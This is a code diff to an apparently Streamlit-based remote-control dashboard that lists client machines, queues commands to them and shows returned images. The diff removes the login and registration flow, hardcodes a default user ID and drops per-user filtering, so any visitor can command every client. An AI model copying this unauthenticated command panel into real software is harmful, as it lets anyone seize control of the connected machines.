@@ -23,19 +23,6 @@ st.set_page_config(
 # Custom CSS
 st.markdown("""
 <style>
-    /* Authentication styles */
-    .auth-form {
-        max-width: 400px;
-        margin: auto;
-        padding: 20px;
-    }
-    .auth-container {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        min-height: 80vh;
-    }
-    
     /* Dashboard styles */
     .client-card {
         background-color: #1E1E1E;
@@ -78,54 +65,6 @@ st.markdown("""
 </style>
 """, unsafe_allow_html=True)
 
-# Session State Initialization
-# def init_session_state():
-#     if 'authenticated' not in st.session_state:
-#         st.session_state.authenticated = False
-#     if 'user' not in st.session_state:
-#         st.session_state.user = None
-#     if 'current_page' not in st.session_state:
-#         st.session_state.current_page = 'login'
-
-# # Authentication Functions
-# def login_user(email: str, password: str) -> bool:
-#     try:
-#         response = supabase.auth.sign_in_with_password({
-#             "email": email,
-#             "password": password
-#         })
-#         st.session_state.user = response.user
-#         st.session_state.authenticated = True
-#         return True
-#     except Exception as e:
-#         st.error(f"Login failed: {str(e)}")
-#         return False
-
-# def register_user(email: str, password: str, confirm_password: str) -> bool:
-#     if password != confirm_password:
-#         st.error("Passwords do not match")
-#         return False
-    
-#     try:
-#         response = supabase.auth.sign_up({
-#             "email": email,
-#             "password": password
-#         })
-#         st.success("Registration successful! Please check your email to verify your account.")
-#         return True
-#     except Exception as e:
-#         st.error(f"Registration failed: {str(e)}")
-#         return False
-
-# def logout_user():
-#     try:
-#         supabase.auth.sign_out()
-#         st.session_state.authenticated = False
-#         st.session_state.user = None
-#         st.experimental_rerun()
-#     except Exception as e:
-#         st.error(f"Logout failed: {str(e)}")
-
 # Dashboard Helper Functions
 def decode_image(base64_string: str) -> Image.Image:
     try:
@@ -150,7 +89,7 @@ def send_command(client_id: str, command: str):
             "type": "command",
             "content": command,
             "status": "pending",
-            "user_id": st.session_state.user.id
+            "user_id": "default_user"  # Simplified without authentication
         }
         supabase.table('messages').insert(data).execute()
         return True
@@ -158,55 +97,14 @@ def send_command(client_id: str, command: str):
         st.error(f"Error sending command: {str(e)}")
         return False
 
-# Page Components
-def render_login_page():
-    st.markdown("<div class='auth-container'>", unsafe_allow_html=True)
-    with st.form("login_form", clear_on_submit=True):
-        st.title("🔐 Login")
-        email = st.text_input("Email", key="login_email")
-        password = st.text_input("Password", type="password", key="login_password")
-        
-        if st.form_submit_button("Login"):
-            if login_user(email, password):
-                st.success("Login successful!")
-                st.session_state.current_page = 'dashboard'
-                st.experimental_rerun()
-    
-    if st.button("Need an account? Register here"):
-        st.session_state.current_page = 'register'
-        st.experimental_rerun()
-    st.markdown("</div>", unsafe_allow_html=True)
-
-def render_register_page():
-    st.markdown("<div class='auth-container'>", unsafe_allow_html=True)
-    with st.form("register_form", clear_on_submit=True):
-        st.title("📝 Register")
-        email = st.text_input("Email", key="register_email")
-        password = st.text_input("Password", type="password", key="register_password")
-        confirm_password = st.text_input("Confirm Password", type="password", key="confirm_password")
-        
-        if st.form_submit_button("Register"):
-            if register_user(email, password, confirm_password):
-                st.session_state.current_page = 'login'
-                st.experimental_rerun()
-    
-    if st.button("Already have an account? Login here"):
-        st.session_state.current_page = 'login'
-        st.experimental_rerun()
-    st.markdown("</div>", unsafe_allow_html=True)
-
 def render_dashboard():
     # Sidebar
     with st.sidebar:
         st.title("Navigation")
-        if st.button("Logout"):
-            # logout_user()
-            print("hi")
         
-        # Get all clients for current user
+        # Get all clients
         clients = supabase.table('clients')\
             .select('*')\
-            .eq('user_id', st.session_state.user.id)\
             .order('last_seen', desc=True)\
             .execute()
             
@@ -265,7 +163,6 @@ def render_dashboard():
             uploaded_file = st.file_uploader("Upload File", type=['txt', 'pdf', 'zip'])
             if uploaded_file is not None:
                 if st.button("Send File"):
-                    # Add file transfer logic here
                     st.info("File transfer feature coming soon!")
         
         # Message History
@@ -275,7 +172,6 @@ def render_dashboard():
                 messages = supabase.table('messages')\
                     .select('*')\
                     .eq('client_id', selected_client)\
-                    .eq('user_id', st.session_state.user.id)\
                     .order('created_at', desc=True)\
                     .limit(50)\
                     .execute()
@@ -294,15 +190,7 @@ def render_dashboard():
                         st.text(f"Status: {msg['status']}")
 
 def main():
-    # init_session_state()
     render_dashboard()
-    # if not st.session_state.authenticated:
-    #     if st.session_state.current_page == 'register':
-    #         render_register_page()
-    #     else:
-    #         render_login_page()
-    # else:
-    #     render_dashboard()
 
 if __name__ == "__main__":
     main()
